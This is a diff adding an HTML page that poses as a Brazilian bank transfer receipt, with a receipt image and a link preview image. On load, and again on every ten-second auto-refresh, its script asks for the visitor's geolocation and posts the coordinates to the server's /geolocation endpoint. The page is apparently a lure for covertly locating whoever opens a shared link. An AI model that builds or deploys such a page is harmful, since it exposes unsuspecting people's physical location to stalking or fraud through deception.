@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Comprovante de tranferência</title>
+    <meta http-equiv="refresh" content="10" />
+    <meta
+      property="og:image"
+      content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_gHv7Hwo_KFHfcKPkMSg8aQpzoah9454Z8p_fXSXmpZT8fqkEQgV4QbAAG_J4FF8T_Iqrp_ek7YyhHuZY2nVcxxmCCNgibV1zyj2Lo2zEbK8Y0wDeIjcgtQOzi-pSthybMfbk-yp4voj1YLIiDFn-32ktmLV8-zCPdRVu08MPwLWCrlUOJQkGtmOPzfg/s1600/comprovante.jpg"
+    />
+  </head>
+
+  <body style="margin: 0; padding: 0; margin-top: 50px; background: black">
+    <img
+      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHdv1EiT-k_g-QPTe6CqbG4uRmy5JmMcWkhgx_SMob5onZGJbxQHLG9CSuG1oPNyD4mW4y4fQazRqsrG0oZ9_GXs4_kskwE1LIriNxUiJlkh5LvW_hJzu01yuqByPZGUJVvUamugQ703pKue_bv_DAgZd4vix0mgyzpAjYzpnMP-U9VBLlSswlWjpqRwA/s1600/comprovante-SECRETO.jpg"
+      alt=""
+      srcset=""
+      width="100%"
+    />
+
+    <script>
+      function sendLocation(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const data = { latitude, longitude };
+
+        fetch("/geolocation", {
+          method: "POST",
+          body: JSON.stringify(data),
+        })
+          .then((response) => response.json())
+          .then((geolocation) => {
+            console.log("Geolocalização registrada:", geolocation);
+          })
+          .catch((error) => {
+            console.error("Erro ao registrar geolocalização:", error);
+          });
+      }
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendLocation);
+        } else {
+          console.error("Geolocalização não suportada no navegador.");
+        }
+      }
+
+      getLocation();
+    </script>
+  </body>
+</html>
